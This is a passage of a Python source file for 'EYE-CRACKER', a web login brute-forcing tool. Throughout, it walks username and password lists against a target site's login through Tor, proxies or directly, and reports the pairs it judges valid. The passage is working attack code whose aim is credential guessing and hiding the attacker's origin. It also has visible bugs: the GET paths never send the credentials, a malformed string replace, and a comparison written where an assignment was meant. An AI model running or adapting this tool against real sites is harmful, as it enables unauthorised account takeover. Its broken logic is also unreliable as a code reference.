        print (f'\n      {f.WHITE}{nbold}[{white}{bold}WebExploit{f.WHITE}{nbold}@{f.RED}EYE-CRACKER/{white}{bold}USE-TOR?{nbold}{f.WHITE}]{f.WHITE} >>> {bold}{tor_use}{nbold}\n')
        t.sleep(2)

        prox_q = input(f'  {f.WHITE}[{f.RED}{bold}WebExploit{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER/{bold}PROXIES{nbold}{f.WHITE} are you like to use \'{bold}Proxy?{nbold}\' [ex: type: socks5, http [ y / n] :#{l_red}{bold} ').lower()


        if prox_q:
            proxy_type = None

            if prox_q == 'y':

                proxy_type = input(f'\n  {f.WHITE}{nbold}[{f.RED}{bold}WebExploit{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER/{bold}PROXIES{nbold}{f.WHITE} enter \'{bold}PROXIES-FORMAT{nbold}\' [ex: proxy.txt . format {bold}\'http / https / socks4 / socks5\':#{l_red}{bold} ').lower()
                if proxy_type == 'http':
                    print (f'\n      {f.WHITE}[{f.GREEN}{bold}WebExploit{f.WHITE}{nbold}@{f.RED}EYE-CRACKER/{bold}PROXY-TYPE{nbold}{f.WHITE}]{f.WHITE} >>> {bold}{proxy_type}{nbold}\n')
                elif proxy_type == 'https':
                    print (f'\n      {f.WHITE}[{f.GREEN}{bold}WebExploit{f.WHITE}{nbold}@{f.RED}EYE-CRACKER/{bold}PROXY-TYPE{nbold}{f.WHITE}]{f.WHITE} >>> {bold}{proxy_type}{nbold}\n')
                elif proxy_type == 'socks4':
                    print (f'\n      {f.WHITE}[{f.GREEN}{bold}WebExploit{f.WHITE}{nbold}@{f.RED}EYE-CRACKER/{bold}PROXY-TYPE{nbold}{f.WHITE}]{f.WHITE} >>> {bold}{proxy_type}{nbold}\n')
                elif proxy_type == 'socks5':
                    print (f'\n      {f.WHITE}[{f.GREEN}{bold}WebExploit{f.WHITE}{nbold}@{f.RED}EYE-CRACKER/{bold}PROXY-TYPE{nbold}{f.WHITE}]{f.WHITE} >>> {bold}{proxy_type}{nbold}\n')
                else:
                    print (f'\n   {f.WHITE}[{f.YELLOW}{bold}WARNING{f.WHITE}{nbold}@{f.CYAN}EYE.CRACKER/{f.GREEN}INFO{white}] USING{bold}{f.GREEN} PROXY-TYPE {cyan}\'DEFAULT{green} socks5\'{nbold}{white} !!!\n')
                    t.sleep(2)
                    proxy_type == 'socks5'
                    print (f'\n      {f.WHITE}[{f.GREEN}{bold}WebExploit{f.WHITE}{nbold}@{f.RED}EYE-CRACKER/{bold}PROXY-TYPE{nbold}{f.WHITE}]{f.WHITE} >>> {bold}{proxy_type}{nbold}\n')

                t.sleep(2)
                prox = input(f'\n  {f.WHITE}[{f.RED}{bold}WebExploit{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER/{bold}PROXY-FILE{nbold}{f.WHITE} enter \'{bold}PROXY-FILE{nbold}\' [ex: proxy.txt . selected format > {bold}\'{proxy_type}\':#{l_red}{bold} ')
                print(f'{nbold}')
                try:
                    proxy = open(prox, 'r').read()
                    print (f'      {f.WHITE}[{f.GREEN}{bold}WebExploit{f.WHITE}{nbold}@{f.RED}EYE-CRACKER/{bold}PROXY{nbold}{f.WHITE}]{f.WHITE} >>> {bold}{prox}{nbold}\n')
                    proxy_use = True
                except:
                    print (f'      {f.WHITE}[{f.RED}{bold}ERROR{f.WHITE}{nbold}] CAN\'T OPEN PROXY FILE [{prox_q}] ! \n')
                    t.sleep(2)
                    print (f'\n   {f.WHITE}[{f.RED}{bold}ALERT{f.WHITE}{nbold}@{f.CYAN}EYE.CRACKER/{f.YELLOW}WARNING{white}] {bold}{f.GREEN} PROXY-MODE {cyan}\'SKIPPED . . .\'{nbold}{white} !!!\n')
                    proxy_use = False
            if prox_q == 'n':
                print (f'\n      {f.WHITE}{nbold}[{f.GREEN}INFO{nbold}{f.WHITE}] proxy mode {bold}{f.CYAN} {white}{nbold}[{bold}{green}skipped{nbold}{white} . . . ] ! \n')
                proxy_use = False

        else:
            print (f'      {f.WHITE}[{f.GREEN}INFO{nbold}{f.WHITE}] proxy mode {bold}{f.CYAN} {white}[{bold}{green}]skipped{nbold}{white} . . . ] ! \n')
            proxy_use = False


    cooki = input(f'  {f.WHITE}[{f.RED}{bold}WebExploit{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER/{bold}COOKIES{nbold}{f.WHITE} are you like to use \'{bold}Cookie?{nbold}\' [ex: y / n ]:#{l_red}{bold} ').lower()
#######
    if cooki:
        if cooki == 'n':
            print (f'\n      {f.WHITE}[{f.GREEN}INFO{nbold}{f.WHITE}] USING COOKIE {bold}{green} SKIPPED  . . . {nbold}{f.WHITE} ! \n')
            cooki = False
            print (f'      {f.WHITE}[{f.GREEN}{bold}WebExploit{f.WHITE}{nbold}@{f.RED}EYE-CRACKER/{bold}COOKIES{nbold}{f.WHITE}]{f.WHITE} >>> {bold}FALSE{nbold}\n\n')
            t.sleep(1)
            #print (f'      {f.WHITE}[{f.GREEN}INFO{nbold}{f.WHITE}] testing cookies {bold}{f.CYAN} on host {nbold}{f.WHITE} [{url}] ! \n')
        if cooki == 'y':

            try:
                cookie = input(f'\n  {nbold}{f.WHITE}{nbold}[{f.RED}{bold}WebExploit{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER/{bold}SET-COOKIES{nbold}{f.WHITE} please enter the \'{bold}Cookies{nbold}\' :#{l_red}{bold} ')

                t.sleep(3)

                print (f'\n      {f.WHITE}{nbold}[{f.GREEN}INFO{nbold}{f.WHITE}] testing cookies {bold}{f.CYAN} on host {nbold}{f.WHITE} [{url}] ! \n')
                cookie_test = r.get(url, headers=headers, cookies=str(cookie))
                cooki = True

            except Exception as cookie_error:
                print (f'      {f.WHITE}[{f.RED}{bold}ERROR{f.WHITE}{nbold}] CAN\'T Send request to {url} with you\'r cookies | ERROR: [{cookie_error}] ! \n')
                t.sleep(2)
                print (f'      {f.WHITE}[{f.GREEN}{bold}INFO{f.WHITE}{nbold}] MAKE REQUEST WITHOUT COOKIE HEADERS  ! \n')
                t.sleep(1)
                cooki = False



    print (f'    {f.WHITE}[{f.WHITE}{bold}WebExploit{f.WHITE}{nbold}@{f.RED}EYE-CRACKER/{bold}INFORMATION{nbold}{f.WHITE}]↓:↓:↓:↓\n')
    t.sleep(1)
    print (f'      {f.WHITE}[{white}{bold}WebExploit{f.WHITE}{nbold}@{f.RED}EYE-CRACKER/{white}{bold}PASSWORD-FILE?{nbold}{f.WHITE}]{f.WHITE} >>> {bold}{pass_list}---[{l_green}%s{white}]{nbold}\n' % (str(len(passwords))))
    t.sleep(1)
    print (f'      {f.WHITE}[{white}{bold}WebExploit{f.WHITE}{nbold}@{f.RED}EYE-CRACKER/{white}{bold}USER-FILE?{nbold}{f.WHITE}]{f.WHITE} >>> {bold}{user_list}---[{l_green}%s{white}]{nbold}\n' % (str(len(user_names))))
    t.sleep(1)
    print (f'      {f.WHITE}[{white}{bold}WebExploit{f.WHITE}{nbold}@{f.RED}EYE-CRACKER/{white}{bold}USE-COOKIES?{nbold}{f.WHITE}]{f.CYAN} >>> {bold}{cooki}{nbold}\n')
    t.sleep(1)
    print (f'      {f.WHITE}[{white}{bold}WebExploit{f.WHITE}{nbold}@{f.RED}EYE-CRACKER/{white}{bold}USE-TOR?{nbold}{f.WHITE}]{f.CYAN} >>> {bold}{tor_use}{nbold}\n')
    t.sleep(1)
    print (f'      {f.WHITE}[{white}{bold}WebExploit{f.WHITE}{nbold}@{f.RED}EYE-CRACKER/{white}{bold}USE-PROXY?{nbold}{f.WHITE}]{f.CYAN} >>> {bold}{proxy_use}[{proxy_type}]{nbold}\n')
    t.sleep(1)
    print (f'      {f.WHITE}[{white}{bold}WebExploit{f.WHITE}{nbold}@{f.RED}EYE-CRACKER/{white}{bold}USE-HEADERS?{nbold}{f.WHITE}]{f.CYAN} >>> {bold}{use_header}{nbold}\n')
    t.sleep(1)
    print (f'      {f.WHITE}[{white}{bold}WebExploit{f.WHITE}{nbold}@{f.RED}EYE-CRACKER/{white}{bold}DELAY?{nbold}{f.WHITE}]{f.CYAN} >>> {bold}%s{nbold}\n' % (str(slep)))
    t.sleep(1)
    print (f'      {f.WHITE}[{white}{bold}WebExploit{f.WHITE}{nbold}@{f.RED}EYE-CRACKER/{white}{bold}METHOD?{nbold}{f.WHITE}]{f.CYAN} >>> {bold}{method}{nbold}\n')
    t.sleep(1)
    print (f'      {f.WHITE}[{white}{bold}WebExploit{f.WHITE}{nbold}@{f.RED}EYE-CRACKER/{white}{bold}AUTH-TYPE?{nbold}{f.WHITE}]{f.CYAN} >>> {bold}{auth_type}---[text]{nbold}\n')
    t.sleep(1)
    print (f'      {f.WHITE}[{white}{bold}WebExploit{f.WHITE}{nbold}@{f.RED}EYE-CRACKER/{white}{bold}AUTH-TEXT?{nbold}{f.WHITE}]{f.CYAN} >>> {bold}{auth_text}---[{auth_type} text]{nbold}\n')

    t.sleep(1)
    print(f'{nbold}')


    def WithTor():

        if method == 'get' or method == 'get-form':
            tor_proxy = {
        'http': 'socks5://localhost:9050',
        'https': 'socks5://localhost:9050'
    }
            tor_error = 'ConnectionError'

            for user in user_names:
                for pwd in passwords:
                    try:
                        result = r.get(url, headers=headers, proxies=tor_proxy)
                        result_text = result.text

                        if auth_type == 'true':
                            if auth_text in result_text:
                                #print (f'      {f.WHITE}[{l_green}{bold}EYE-CRACKER{f.WHITE}{nbold}]{f.CYAN}<[{bold}{l_green}TRUE{nbold}{white}]>[{bold}{l_gray}USERNAME{white}{nbold}]---[{bold}{l_gray}{user}] | [{bold}{l_gray}PASSWORD{white}{nbold}]---[{bold}{l_gray}{pwd}]{nbold}\n')
                                print (f'      {f.WHITE}[{l_green}{bold}EYE-CRACKER{f.WHITE}{nbold}]{f.CYAN}<[{bold}{l_green}TRUE{nbold}{white}]>[{bold}{l_gray}USERNAME{white}{nbold}]---[{bold}{l_gray}{user}] | [{bold}{l_gray}PASSWORD{white}{nbold}]---[{bold}{l_gray}{pwd}]{nbold} ~ [{bold}{l_gray}URL{white}{nbold}]-[{bold}{l_gray}{urll}]{nbold}---[STATUS]---[%s]\n' % (str(result.status_code)))
                                t.sleep(1)
                                print (f'      {f.WHITE}[{l_green}{bold}EYE-CRACKER{f.WHITE}{nbold}]{white}<[{bold}{l_green}TRUE{nbold}{white}]>[{bold}{l_gray}AUTH TEXT{nbold}{white}]---[{l_gray}{auth_text}{white}]---[{l_green} WAS {bold}FOUND{nbold} IN SITE !{nbold}{white}]')
                                break
                            else:
                                print (f'      {f.WHITE}[{l_red}{bold}EYE-CRACKER{f.WHITE}{nbold}]{white}<[{bold}{l_red}FALSE{nbold}{white}]>[{bold}{l_gray}USERNAME{white}{nbold}]---[{bold}{l_gray}{user}] | [{bold}{l_gray}PASSWORD{white}{nbold}]---[{bold}{l_gray}{pwd}]{nbold}\n')
                               # continue


                        if auth_type == 'false':
                            if auth_text not in result_text:
                                print (f'      {f.WHITE}[{l_green}{bold}EYE-CRACKER{f.WHITE}{nbold}]{f.CYAN}<[{bold}{l_green}TRUE{nbold}{white}]>[{bold}{l_gray}USERNAME{white}{nbold}]---[{bold}{l_gray}{user}] | [{bold}{l_gray}PASSWORD{white}{nbold}]---[{bold}{l_gray}{pwd}]{nbold} ~ [{bold}{l_gray}URL{white}{nbold}]-[{bold}{l_gray}{urll}]{nbold}---[STATUS]---[%s]\n' % (str(result.status_code)))
                                t.sleep(1)
                                print (f'      {f.WHITE}[{l_green}{bold}EYE-CRACKER{f.WHITE}{nbold}{white}]<[{bold}{l_green}TRUE{nbold}{white}]>[{bold}{l_gray}AUTH TEXT{nbold}{white}]---[{l_gray}{auth_text}{white}]---[{l_green} WAS {bold}NOT FOUND{nbold} IN SITE !{nbold}{white}]')
                                break
                            else:
                                print (f'      {f.WHITE}[{l_red}{bold}EYE-CRACKER{f.WHITE}{nbold}]{f.CYAN}<[{bold}{l_red}FALSE{nbold}{white}]>[{bold}{l_gray}USERNAME{white}{nbold}]---[{bold}{l_gray}{user}] | [{bold}{l_gray}PASSWORD{white}{nbold}]---[{bold}{l_gray}{pwd}]{nbold}\n')
                        else:
                            print (f'      {f.WHITE}[{l_red}{bold}EYE-CRACKER{f.WHITE}{nbold}{white}]<[{bold}{l_red}FALSE{nbold}{white}]>[{bold}{l_gray}USERNAME{white}{nbold}]---[{bold}{l_gray}{user}] | [{bold}{l_gray}PASSWORD{white}{nbold}]---[{bold}{l_gray}{pwd}]{nbold}\n')
                        try:
                            t.sleep(slep)
                        except:
                            pass
                    except ConnectionError:
                        print(f'\n  {f.WHITE}[{f.RED}{bold}ERROR{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER{white}@{nbold}{l_red}/TorError{f.WHITE}] Forgot Run Tor? | EYE CRACKER STOPED ! PLEASE RUN {bold}{l_green}TOR{white}{nbold} IN A {bold}NEW TAB{nbold} AND TRY AGAN {nbold}\n')
                        t.sleep(3)
                        print(f'\n  {f.WHITE}[{f.GREEN}INFO{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER{nbold}{f.WHITE}] EXITTING . . . {nbold}\n')
                        sys.exit(0)
                        #break
        if method == 'post' or method == 'post-form':
            tor_proxy = {
        'http': 'socks5://localhost:9050',
        'https': 'socks5://localhost:9050'
    }
            tor_error = 'ConnectionError'

            for user in user_names:
                final_user_dataa = user_data.replace('$USER$',user)
                for pwd in passwords:
                    final_user_data = final_user_dataa.replace('$PASSWORD$, pwd')
                    try:
                        result = r.post(url, headers=headers, data=final_user_data ,proxies=tor_proxy)
                        result_text = result.text

                        if auth_type == 'true':
                            if auth_text in result_text:
                                #print (f'      {f.WHITE}[{l_green}{bold}EYE-CRACKER{f.WHITE}{nbold}]{f.CYAN}<[{bold}{l_green}TRUE{nbold}{white}]>[{bold}{l_gray}USERNAME{white}{nbold}]---[{bold}{l_gray}{user}] | [{bold}{l_gray}PASSWORD{white}{nbold}]---[{bold}{l_gray}{pwd}]{nbold}\n')
                                print (f'      {f.WHITE}[{l_green}{bold}EYE-CRACKER{f.WHITE}{nbold}]{f.CYAN}<[{bold}{l_green}TRUE{nbold}{white}]>[{bold}{l_gray}USERNAME{white}{nbold}]---[{bold}{l_gray}{user}] | [{bold}{l_gray}PASSWORD{white}{nbold}]---[{bold}{l_gray}{pwd}]{nbold} ~ [{bold}{l_gray}URL{white}{nbold}]-[{bold}{l_gray}{urll}]{nbold}---[STATUS]---[%s]\n' % (str(result.status_code)))
                                t.sleep(1)
                                print (f'      {f.WHITE}[{l_green}{bold}EYE-CRACKER{f.WHITE}{nbold}]{f.CYAN}<[{bold}{l_green}TRUE{nbold}{white}]>[{bold}{l_gray}AUTH TEXT{nbold}{white}]---[{l_gray}{auth_text}{white}]---[{l_green} WAS {bold}FOUND{nbold} IN SITE !{nbold}{white}]')
                                break
                            else:
                                #print (f'      {f.WHITE}[{l_red}{bold}EYE-CRACKER{f.WHITE}{nbold}]{f.CYAN}<[{bold}{l_red}FALSE{nbold}{white}]>[{bold}{l_gray}USERNAME{white}{nbold}]---[{bold}{l_gray}{user}] | [{bold}{l_gray}PASSWORD{white}{nbold}]---[{bold}{l_gray}{pwd}]{nbold} ~ [{bold}{l_gray}URL{white}{nbold}]-[{bold}{l_gray}{urll}]{nbold}---[STATUS]---[%s]\n' % (str(result.status_code)))
                                continue


                        if auth_type == 'false':
                            if auth_text not in result_text:
                                print (f'      {f.WHITE}[{l_green}{bold}EYE-CRACKER{f.WHITE}{nbold}]{f.CYAN}<[{bold}{l_green}TRUE{nbold}{white}]>[{bold}{l_gray}USERNAME{white}{nbold}]---[{bold}{l_gray}{user}] | [{bold}{l_gray}PASSWORD{white}{nbold}]---[{bold}{l_gray}{pwd}]{nbold} ~ [{bold}{l_gray}URL{white}{nbold}]-[{bold}{l_gray}{urll}]{nbold}---[STATUS]---[%s]\n' % (str(result.status_code)))
                                t.sleep(1)
                                print (f'      {f.WHITE}[{l_green}{bold}EYE-CRACKER{f.WHITE}{nbold}]{f.CYAN}<[{bold}{l_green}TRUE{nbold}{white}]>[{bold}{l_gray}AUTH TEXT{nbold}{white}]---[{l_gray}{auth_text}{white}]---[{l_green} WAS {bold}NOT FOUND{nbold} IN SITE !{nbold}{white}]')
                                break
                            else:
                                continue
                        else:
                            print (f'      {f.WHITE}[{l_red}{bold}EYE-CRACKER{f.WHITE}{nbold}]{f.CYAN}<[{bold}{l_red}FALSE{nbold}{white}]>[{bold}{l_gray}USERNAME{white}{nbold}]---[{bold}{l_gray}{user}] | [{bold}{l_gray}PASSWORD{white}{nbold}]---[{bold}{l_gray}{pwd}]{nbold}\n')
                            continue
                        try:
                            t.sleep(slep)
                        except:
                            pass

                    except ConnectionError: # tor error
                        print(f'\n  {f.WHITE}[{f.RED}{bold}ERROR{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER{white}@{nbold}{l_red}/TorError{f.WHITE}] Forgot Run Tor? | EYE CRACKER STOPED ! PLEASE RUN {bold}{l_green}TOR{white}{nbold} IN A {bold}NEW TAB{nbold} AND TRY AGAN {nbold}\n')
                        t.sleep(3)
                        print(f'\n  {f.WHITE}[{f.GREEN}INFO{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER{nbold}{f.WHITE}] EXITTING . . . {nbold}\n')
                        sys.exit(0)
                        #break

    def WithProxy():
        if method == 'get' or method == 'get-form':
            _proxy = {
        'http': proxy_type+'://localhost:9050',
        'https': proxy_type+'://localhost:9050'
    }
            tor_error = 'ConnectionError'

            for user in user_names:
                for pwd in passwords:
                    try:
                        result = r.get(url, headers=headers, proxies=_proxy)
                        result_text = result.text

                        if auth_type == 'true':
                            if auth_text in result_text:
                                #print (f'      {f.WHITE}[{l_green}{bold}EYE-CRACKER{f.WHITE}{nbold}]{f.CYAN}<[{bold}{l_green}TRUE{nbold}{white}]>[{bold}{l_gray}USERNAME{white}{nbold}]---[{bold}{l_gray}{user}] | [{bold}{l_gray}PASSWORD{white}{nbold}]---[{bold}{l_gray}{pwd}]{nbold}\n')
                                print (f'      {f.WHITE}[{l_green}{bold}EYE-CRACKER{f.WHITE}{nbold}]{f.CYAN}<[{bold}{l_green}TRUE{nbold}{white}]>[{bold}{l_gray}USERNAME{white}{nbold}]---[{bold}{l_gray}{user}] | [{bold}{l_gray}PASSWORD{white}{nbold}]---[{bold}{l_gray}{pwd}]{nbold} ~ [{bold}{l_gray}URL{white}{nbold}]-[{bold}{l_gray}{urll}]{nbold}---[STATUS]---[%s]\n' % (str(result.status_code)))
                                t.sleep(1)
                                print (f'      {f.WHITE}[{l_green}{bold}EYE-CRACKER{f.WHITE}{nbold}]{white}<[{bold}{l_green}TRUE{nbold}{white}]>[{bold}{l_gray}AUTH TEXT{nbold}{white}]---[{l_gray}{auth_text}{white}]---[{l_green} WAS {bold}FOUND{nbold} IN SITE !{nbold}{white}]')
                                break
                            else:
                                print (f'      {f.WHITE}[{l_red}{bold}EYE-CRACKER{f.WHITE}{nbold}]{white}<[{bold}{l_red}FALSE{nbold}{white}]>[{bold}{l_gray}USERNAME{white}{nbold}]---[{bold}{l_gray}{user}] | [{bold}{l_gray}PASSWORD{white}{nbold}]---[{bold}{l_gray}{pwd}]{nbold}\n')
                               # continue


                        if auth_type == 'false':
                            if auth_text not in result_text:
                                print (f'      {f.WHITE}[{l_green}{bold}EYE-CRACKER{f.WHITE}{nbold}]{f.CYAN}<[{bold}{l_green}TRUE{nbold}{white}]>[{bold}{l_gray}USERNAME{white}{nbold}]---[{bold}{l_gray}{user}] | [{bold}{l_gray}PASSWORD{white}{nbold}]---[{bold}{l_gray}{pwd}]{nbold} ~ [{bold}{l_gray}URL{white}{nbold}]-[{bold}{l_gray}{urll}]{nbold}---[STATUS]---[%s]\n' % (str(result.status_code)))
                                t.sleep(1)
                                print (f'      {f.WHITE}[{l_green}{bold}EYE-CRACKER{f.WHITE}{nbold}{white}]<[{bold}{l_green}TRUE{nbold}{white}]>[{bold}{l_gray}AUTH TEXT{nbold}{white}]---[{l_gray}{auth_text}{white}]---[{l_green} WAS {bold}NOT FOUND{nbold} IN SITE !{nbold}{white}]')
                                break
                            else:
                                print (f'      {f.WHITE}[{l_red}{bold}EYE-CRACKER{f.WHITE}{nbold}]{f.CYAN}<[{bold}{l_red}FALSE{nbold}{white}]>[{bold}{l_gray}USERNAME{white}{nbold}]---[{bold}{l_gray}{user}] | [{bold}{l_gray}PASSWORD{white}{nbold}]---[{bold}{l_gray}{pwd}]{nbold}\n')
                        else:
                            print (f'      {f.WHITE}[{l_red}{bold}EYE-CRACKER{f.WHITE}{nbold}{white}]<[{bold}{l_red}FALSE{nbold}{white}]>[{bold}{l_gray}USERNAME{white}{nbold}]---[{bold}{l_gray}{user}] | [{bold}{l_gray}PASSWORD{white}{nbold}]---[{bold}{l_gray}{pwd}]{nbold}\n')
                        try:
                            t.sleep(slep)
                        except:
                            pass
                    except ConnectionError:
                        continue
                        # print(f'\n  {f.WHITE}[{f.RED}{bold}ERROR{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER{white}@{nbold}{l_red}/TorError{f.WHITE}] Forgot Run Tor? | EYE CRACKER STOPED ! PLEASE RUN {bold}{l_green}TOR{white}{nbold} IN A {bold}NEW TAB{nbold} AND TRY AGAN {nbold}\n')
                        # t.sleep(3)
                        # print(f'\n  {f.WHITE}[{f.GREEN}INFO{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER{nbold}{f.WHITE}] EXITTING . . . {nbold}\n')
                        # sys.exit(0)
                        #break
        if method == 'post' or method == 'post-form':
            _proxy = {
        'http': proxy_type+'://localhost:9050',
        'https': proxy_type+'://localhost:9050'
    }


            for user in user_names:
                final_user_dataa = user_data.replace('$USER$',user)
                for pwd in passwords:
                    final_user_data = final_user_dataa.replace('$PASSWORD$, pwd')
                    try:
                        result = r.post(url, headers=headers, data=final_user_data ,proxies=_proxy)
                        result_text = result.text

                        if auth_type == 'true':
                            if auth_text in result_text:
                                #print (f'      {f.WHITE}[{l_green}{bold}EYE-CRACKER{f.WHITE}{nbold}]{f.CYAN}<[{bold}{l_green}TRUE{nbold}{white}]>[{bold}{l_gray}USERNAME{white}{nbold}]---[{bold}{l_gray}{user}] | [{bold}{l_gray}PASSWORD{white}{nbold}]---[{bold}{l_gray}{pwd}]{nbold}\n')
                                print (f'      {f.WHITE}[{l_green}{bold}EYE-CRACKER{f.WHITE}{nbold}]{f.CYAN}<[{bold}{l_green}TRUE{nbold}{white}]>[{bold}{l_gray}USERNAME{white}{nbold}]---[{bold}{l_gray}{user}] | [{bold}{l_gray}PASSWORD{white}{nbold}]---[{bold}{l_gray}{pwd}]{nbold} ~ [{bold}{l_gray}URL{white}{nbold}]-[{bold}{l_gray}{urll}]{nbold}---[STATUS]---[%s]\n' % (str(result.status_code)))
                                t.sleep(1)
                                print (f'      {f.WHITE}[{l_green}{bold}EYE-CRACKER{f.WHITE}{nbold}]{f.CYAN}<[{bold}{l_green}TRUE{nbold}{white}]>[{bold}{l_gray}AUTH TEXT{nbold}{white}]---[{l_gray}{auth_text}{white}]---[{l_green} WAS {bold}FOUND{nbold} IN SITE !{nbold}{white}]')
                                break
                            else:
                                #print (f'      {f.WHITE}[{l_red}{bold}EYE-CRACKER{f.WHITE}{nbold}]{f.CYAN}<[{bold}{l_red}FALSE{nbold}{white}]>[{bold}{l_gray}USERNAME{white}{nbold}]---[{bold}{l_gray}{user}] | [{bold}{l_gray}PASSWORD{white}{nbold}]---[{bold}{l_gray}{pwd}]{nbold} ~ [{bold}{l_gray}URL{white}{nbold}]-[{bold}{l_gray}{urll}]{nbold}---[STATUS]---[%s]\n' % (str(result.status_code)))
                                continue


                        if auth_type == 'false':
                            if auth_text not in result_text:
                                print (f'      {f.WHITE}[{l_green}{bold}EYE-CRACKER{f.WHITE}{nbold}]{f.CYAN}<[{bold}{l_green}TRUE{nbold}{white}]>[{bold}{l_gray}USERNAME{white}{nbold}]---[{bold}{l_gray}{user}] | [{bold}{l_gray}PASSWORD{white}{nbold}]---[{bold}{l_gray}{pwd}]{nbold} ~ [{bold}{l_gray}URL{white}{nbold}]-[{bold}{l_gray}{urll}]{nbold}---[STATUS]---[%s]\n' % (str(result.status_code)))
                                t.sleep(1)
                                print (f'      {f.WHITE}[{l_green}{bold}EYE-CRACKER{f.WHITE}{nbold}]{f.CYAN}<[{bold}{l_green}TRUE{nbold}{white}]>[{bold}{l_gray}AUTH TEXT{nbold}{white}]---[{l_gray}{auth_text}{white}]---[{l_green} WAS {bold}NOT FOUND{nbold} IN SITE !{nbold}{white}]')
                                break
                            else:
                                continue
                        else:
                            print (f'      {f.WHITE}[{l_red}{bold}EYE-CRACKER{f.WHITE}{nbold}]{f.CYAN}<[{bold}{l_red}FALSE{nbold}{white}]>[{bold}{l_gray}USERNAME{white}{nbold}]---[{bold}{l_gray}{user}] | [{bold}{l_gray}PASSWORD{white}{nbold}]---[{bold}{l_gray}{pwd}]{nbold}\n')
                            continue
                        try:
                            t.sleep(slep)
                        except:
                            pass

                    except ConnectionError:
                        continue
                        # print(f'\n  {f.WHITE}[{f.RED}{bold}ERROR{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER{white}@{nbold}{l_red}/ProxyError{f.WHITE}] Forgot check proxies? | EYE CRACKER STOPED ! PLEASE check {bold}{l_green}TOR{white}{nbold} IN A {bold}NEW TAB{nbold} AND TRY AGAN {nbold}\n')
                        #t.sleep(3)
                        #print(f'\n  {f.WHITE}[{f.GREEN}INFO{f.WHITE}{nbold}@{f.CYAN}EYE-CRACKER{nbold}{f.WHITE}] EXITTING . . . {nbold}\n')
                        #sys.exit(0)
                        #break


    def noProxy():
        if method == 'get' or method == 'get-form':
            for user in user_names:
                for pwd in passwords:
                    try:
                        result = r.get(url, headers=headers)
                        result_text = result.text

                        if auth_type == 'true':
                            if auth_text in result_text:
                                #print (f'      {f.WHITE}[{l_green}{bold}EYE-CRACKER{f.WHITE}{nbold}]{f.CYAN}<[{bold}{l_green}TRUE{nbold}{white}]>[{bold}{l_gray}USERNAME{white}{nbold}]---[{bold}{l_gray}{user}] | [{bold}{l_gray}PASSWORD{white}{nbold}]---[{bold}{l_gray}{pwd}]{nbold}\n')
                                print (f'      {f.WHITE}[{l_green}{bold}EYE-CRACKER{f.WHITE}{nbold}]{f.CYAN}<[{bold}{l_green}TRUE{nbold}{white}]>[{bold}{l_gray}USERNAME{white}{nbold}]---[{bold}{l_gray}{user}] | [{bold}{l_gray}PASSWORD{white}{nbold}]---[{bold}{l_gray}{pwd}]{nbold} ~ [{bold}{l_gray}URL{white}{nbold}]-[{bold}{l_gray}{urll}]{nbold}---[STATUS]---[%s]\n' % (str(result.status_code)))
                                t.sleep(1)
                                print (f'      {f.WHITE}[{l_green}{bold}EYE-CRACKER{f.WHITE}{nbold}]{white}<[{bold}{l_green}TRUE{nbold}{white}]>[{bold}{l_gray}AUTH TEXT{nbold}{white}]---[{l_gray}{auth_text}{white}]---[{l_green} WAS {bold}FOUND{nbold} IN SITE !{nbold}{white}]')
                                break
                            else:
                                print (f'      {f.WHITE}[{l_red}{bold}EYE-CRACKER{f.WHITE}{nbold}]{white}<[{bold}{l_red}FALSE{nbold}{white}]>[{bold}{l_gray}USERNAME{white}{nbold}]---[{bold}{l_gray}{user}] | [{bold}{l_gray}PASSWORD{white}{nbold}]---[{bold}{l_gray}{pwd}]{nbold}\n')
                               # continue


                        if auth_type == 'false':
                            if auth_text not in result_text:
                                print (f'      {f.WHITE}[{l_green}{bold}EYE-CRACKER{f.WHITE}{nbold}]{f.CYAN}<[{bold}{l_green}TRUE{nbold}{white}]>[{bold}{l_gray}USERNAME{white}{nbold}]---[{bold}{l_gray}{user}] | [{bold}{l_gray}PASSWORD{white}{nbold}]---[{bold}{l_gray}{pwd}]{nbold} ~ [{bold}{l_gray}URL{white}{nbold}]-[{bold}{l_gray}{urll}]{nbold}---[STATUS]---[%s]\n' % (str(result.status_code)))
                                t.sleep(1)
                                print (f'      {f.WHITE}[{l_green}{bold}EYE-CRACKER{f.WHITE}{nbold}{white}]<[{bold}{l_green}TRUE{nbold}{white}]>[{bold}{l_gray}AUTH TEXT{nbold}{white}]---[{l_gray}{auth_text}{white}]---[{l_green} WAS {bold}NOT FOUND{nbold} IN SITE !{nbold}{white}]')
                                break
                            else:
                                print (f'      {f.WHITE}[{l_red}{bold}EYE-CRACKER{f.WHITE}{nbold}]{f.CYAN}<[{bold}{l_red}FALSE{nbold}{white}]>[{bold}{l_gray}USERNAME{white}{nbold}]---[{bold}{l_gray}{user}] | [{bold}{l_gray}PASSWORD{white}{nbold}]---[{bold}{l_gray}{pwd}]{nbold}\n')
                        else:
                            print (f'      {f.WHITE}[{l_red}{bold}EYE-CRACKER{f.WHITE}{nbold}{white}]<[{bold}{l_red}FALSE{nbold}{white}]>[{bold}{l_gray}USERNAME{white}{nbold}]---[{bold}{l_gray}{user}] | [{bold}{l_gray}PASSWORD{white}{nbold}]---[{bold}{l_gray}{pwd}]{nbold}\n')
                        try:
                            t.sleep(slep)
                        except:
                            pass
                    except:
                        pass
                        #break
        if method == 'post' or method == 'post-form':


            for user in user_names:
                final_user_dataa = user_data.replace('$USER$',user)
                for pwd in passwords:
                    final_user_data = final_user_dataa.replace('$PASSWORD$, pwd')
                    try:
                        result = r.post(url, headers=headers, data=final_user_data)
                        result_text = result.text

                        if auth_type == 'true':
                            if auth_text in result_text:
                                #print (f'      {f.WHITE}[{l_green}{bold}EYE-CRACKER{f.WHITE}{nbold}]{f.CYAN}<[{bold}{l_green}TRUE{nbold}{white}]>[{bold}{l_gray}USERNAME{white}{nbold}]---[{bold}{l_gray}{user}] | [{bold}{l_gray}PASSWORD{white}{nbold}]---[{bold}{l_gray}{pwd}]{nbold}\n')
